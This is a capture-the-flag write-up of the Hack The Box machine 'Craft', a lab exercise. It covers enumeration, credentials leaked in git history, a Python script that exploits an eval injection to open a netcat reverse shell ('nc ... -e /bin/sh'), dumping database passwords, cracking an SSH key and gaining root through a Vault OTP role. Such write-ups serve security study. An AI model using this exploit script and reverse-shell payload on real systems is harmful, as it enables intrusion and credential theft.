2020/01/03

# HTB Craft

## Part 1 - Initial Enumeration
Let's start our initial enumeration by performing a tcp port scan.
```
$ nmap -sCSV -p 1-10000 10.10.10.110
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-31 02:47 AEDT
Nmap scan report for 10.10.10.110
Host is up (0.066s latency).
Not shown: 9997 closed ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)
| ssh-hostkey: 
|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)
|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)
|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)
443/tcp  open  ssl/http nginx 1.15.8
|_http-server-header: nginx/1.15.8
|_http-title: About
| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US
| Not valid before: 2019-02-06T02:25:47
|_Not valid after:  2020-06-20T02:25:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
6022/tcp open  ssh      (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-Go
| ssh-hostkey: 
|_  2048 5b:cc:bf:f1:a1:8f:72:b0:c0:fb:df:a3:01:dc:a6:fb (RSA)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port6022-TCP:V=7.80%I=7%D=12/31%Time=5E0A1C5C%P=x86_64-pc-linux-gnu%r(N
SF:ULL,C,"SSH-2\.0-Go\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Nothing particularly interesting here. An HTTPS server running on port 443, and a weird looking SSH
server running on port 6022. Some research on the technologies behind the 6022 SSH server reveal
some username enumeration vulnerabilities but nothing of note.

Let's fire up burpsuite and begin spidering the HTTPS server (let's not forget to add "craft.htb"
to our /etc/hosts file). We just want to get a feel for what is on the site.

The first thing that jumps out at me are links to two virtual hosts "api.craft.htb", and
"gogs.craft.htb". Before jumping to those subdomains, we should probably do some vhost discovery.
Let's fire up gobuster and take a look.
```
$ gobuster vhost -u https://craft.htb --wordlist=SecLists/Discovery/Web-Content/common.txt -k
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:          https://craft.htb
[+] Threads:      10
[+] Wordlist:     SecLists/Discovery/Web-Content/common.txt
[+] User Agent:   gobuster/3.0.1
[+] Timeout:      10s
===============================================================
2019/12/31 02:58:21 Starting gobuster
===============================================================
Found: api.craft.htb (Status: 404) [Size: 233]
Found: vault.craft.htb (Status: 404) [Size: 19]
===============================================================
2019/12/31 02:58:55 Finished
===============================================================
```

Nice, so we found another vhost; "vault.craft.htb". I think our next step should be to visit the
"api.craft.htb" vhost, so let's add this to our scope on burp and begin enumeration (note: don't
forget to add the vhosts to your /etc/hosts file).

Just a swagger api spec here, however this vhost does appear to contain all the api functionality
for some application, could be a way in, but we'll take a closer look later. Let's have a look at
the "gogs.craft.htb" vhost next.

This page is a lot more interesting. It's a self-hosted git management service. When we visit the
"explore" link, we discover what looks like the repository for the api we discovered earlier.
Digging through the issues and commit history we find some credentials for the api in a test script
that Dinesh uploaded, but later removed. Oh no, Dinesh.
```
+response = requests.get('https://api.craft.htb/api/auth/login',  auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False)
```

A quick `curl` request will confirm whether
these credentials are still valid.
```
$ curl https://api.craft.htb/api/auth/login -u dinesh:4aUh0A8PbVJxgd -k
{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTc3NzMzNTYwfQ.oLb0iw5P-JOaWpB3Jjq14VwIm8AJRmp3lQjcNY014lY"}
```

They're still valid. Oh no, Dinesh. Why? I hope you haven't re-used these credentials for the
git management service. Let's give them a try.

Sigh, they worked. I'm not sure what I expected. Let's dig around some more now that we have access
to Dinesh's account.

## Part 2 - Initial Foothold
So a bit more digging around with Dinesh's account didn't reveal anything too important. However I
went through all the commits again we find a fix that Dinesh committed. Where he used an eval
statement on user input. Oh, Dinesh. Unfortunately we need credentials to use it. But guess who
leaked their credentials earlier? Thanks, Dinesh. Now we just need to figure out how we can get
RCE. Let's write a quick python script to leverage this and see if we can get a reverse shell.

```python
#!/usr/bin/python3

PAYLOAD = 'nc 10.10.14.41 4444 -e /bin/sh'

import requests
import json
from urllib3.exceptions import InsecureRequestWarning

# Ignore insecure https request warnings.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

base_url = 'https://api.craft.htb/api/'
creds = ('dinesh', '4aUh0A8PbVJxgd')

# Retrieve the authentication token.
r = requests.get(base_url+'auth/login', auth=creds, verify=False)

# Set our headers.
headers = {
    'X-Craft-API-Token': r.json()['token'],
    'Content-Type': 'application/json'
}

# Check whether token is valid.
r = requests.get(base_url+'auth/check', headers=headers, verify=False)
assert r.json()['message'] == 'Token is valid!'

# Craft payload.
payload = {
    'name': 'ghuul',
    'brewer': 'ghuul',
    'style': 'ghuul'
}
payload['abv'] = '__import__("os").system("%s") or 10' % PAYLOAD

# Make request with payload.
payload = json.dumps(payload)
requests.post(base_url+'brew/', headers=headers, data=payload, verify=False)
```

Let's start up netcat on our end... and we have a shell.
```
$ nc -lv -p 4444
listening on [any] 4444 ...
connect to [10.10.xx.xx] from craft.htb [10.10.10.110] 45519
# ls
app.py
craft_api
dbtest.py
tests
```

## Part 3 - Getting User
So, a few things to note: we're logged in as root, but we can't `cat /root/root.txt`. In
conclusion, we are in a jail. Let's do some digging around on the server for now, there seem to be
a few interesting files.
```
# whoami
root
```

After a tiny bit of digging I ran into a file called `dbtest.py` (we ran into it earlier on the
git repo too), and it seems to connect and query the database successfully. So what happens if we
upload our own version that allows us to execute arbitrary queries? With a slight modification to
our foothold script we can upload a file to the server. 
```python
PAYLOAD = 'nc 10.10.xx.xx 4444 > database.py'
```
```
$ nc -lv -p 4444 < database.py
listening on [any] 4444 ...
connect to [10.10.xx.xx] from craft.htb [10.10.10.110] 4220
```

Now let's list the tables for the database, and see if we can read some of the more interesting
sounding ones.

```
$ nc -lv -p 4444
listening on [any] 4444 ...
connect to [10.10.xx.xx] from craft.htb [10.10.10.110] 39969
# ls
app.py
craft_api
database.py
dbtest.py
tests
# python3 database.py
 >> SELECT table_name FROM information_schema.tables
{'TABLE_NAME': 'brew'}
{'TABLE_NAME': 'user'}

...

 >> SELECT * FROM user 
{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}
{'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}
{'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}
 >> exit
# exit
```

Awesome! More credentials. I wonder if any of these will work for the web server? Let's try logging
into the git management service with these new credentials.

Gilfoyle! Of all the people I wouldn't have expected to re-use credentials, it was you? Even
Erlich didn't re-use his for the git management service! Anyway, a bit of clicking around reveals a
new private repository. And in this repository... an ssh key! More credentials, yikes, but at least
this repo is private. Let's try and use this new key, taking a look at the public key, it looks
like he used the username "gilfoyle".
```
$ ssh -i ssh_gilfoyle gilfoyle@10.10.10.110

  .   *   ..  . *  *
*  * @()Ooc()*   o  .
    (Q@*0CG*O()  ___
   |\_________/|/ _ \
   |  |  |  |  | / | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | \_| |
   |  |  |  |  |\___/
   |\_|__|__|_/|
    \_________/

Enter passphrase for key 'keys/ssh_gilfoyle':
```

Ah, a password. No matter. Let's get cracking.
```
$ /usr/share/john/ssh2john.py ssh_gilfoyle > ssh_gilfoyle.hash
$ john ssh_gilfoyle.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 12 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
```

Wow, nothing? I guess we'll try the password he re-used for the git service, since the guys at
Pied Piper seem to like re-using credentials.
```
$ ssh -i keys/ssh_gilfoyle gilfoyle@10.10.10.110


  .   *   ..  . *  *
*  * @()Ooc()*   o  .
    (Q@*0CG*O()  ___
   |\_________/|/ _ \
   |  |  |  |  | / | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | \_| |
   |  |  |  |  |\___/
   |\_|__|__|_/|
    \_________/



Enter passphrase for key 'keys/ssh_gilfoyle':
gilfoyle@craft:~$ 
```

And... we're in. So much credential re-use. Guys, get a password manager, seriously. Let's get the
user flag now.
```
gilfoyle@craft:~$ cat user.txt 
bbf4b0cadfa3d4e6d0914c9cd5a612d4
```

## Part 4 - Getting Root
To start, let's take a look at Gilfoyle's home directory. Interesting, a file called .vault-token?
We've seen mentions of a "vault" around the git repo and we found a vhost with the name "vault".
Let's take a look at the files we saw on the git repo.
```
vault secrets enable ssh

vault write ssh/roles/root_otp \
    key_type=otp \
    default_user=root \
    cidr_list=0.0.0.0/0
```

Interesting. Seems like there is some sort of SSH system here. I think it's time to do some
Googling and see what we can find out about this service.

So after a bit of research it's pretty obvious that this is set up as a OTP authentication system
for SSH. You can read more about it
[here](https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html). It seems that
this one is set up for SSH'ing in as root, nice. Let's give this a go.
```
gilfoyle@craft:~$ vault ssh -role root_otp -mode otp root@10.10.10.110
OTP for the session is: 91220244-1b96-5827-2533-9e05874b36b2
Password:
root@craft:~#
```

Perfect, it worked. Let's get the root flag.
```
root@craft:~# cat root.txt 
831d64ef54d92c1af795daae28a11591
```

## Part 5 - Lessons Learned
 * People re-use passwords, like, a lot. So when you find credentials, try them everywhere.
 * Always leverage bad coding practices, like the use of "eval", and "exec", etc.
 * People commonly commit credentials to git repos and later remove them, not realising they're still in the commit history.
